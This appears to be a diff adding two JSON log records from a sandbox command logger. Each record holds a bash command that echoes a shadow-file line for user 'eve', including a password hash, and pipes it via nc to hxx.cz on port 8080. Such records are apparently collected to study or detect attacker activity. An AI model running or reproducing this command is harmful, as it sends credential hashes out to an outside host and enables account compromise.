@@ -1,0 +1,2 @@
+{"sandbox_id": "80", "timestamp_str": "2020-07-15T10:16:00.613452+02:00", "cmd_type": "bash-command", "cmd": "echo 'eve:$6$eDIUpTqNub/vHNdW$1OxDFqCfsUBdhYWqY6f2P37WcGUznmP7BCEmEADlIkvxkpjzOy3zv3MJTxAC53a1oPtoBpvzRksNCzO4pppiy.:18451:0:99999:7:::' |nc hxx.cz 8080"}
+{"sandbox_id": "80", "timestamp_str": "2020-07-15T10:16:27.315064+02:00", "cmd_type": "bash-command", "cmd": "echo 'eve:$6$eDIUpTqNub/vHNdW$1OxDFqCfsUBdhYWqY6f2P37WcGUznmP7BCEmEADlIkvxkpjzOy3zv3MJTxAC53a1oPtoBpvzRksNCzO4pppiy.:18451:0:99999:7:::' | nc hxx.cz 8080"}
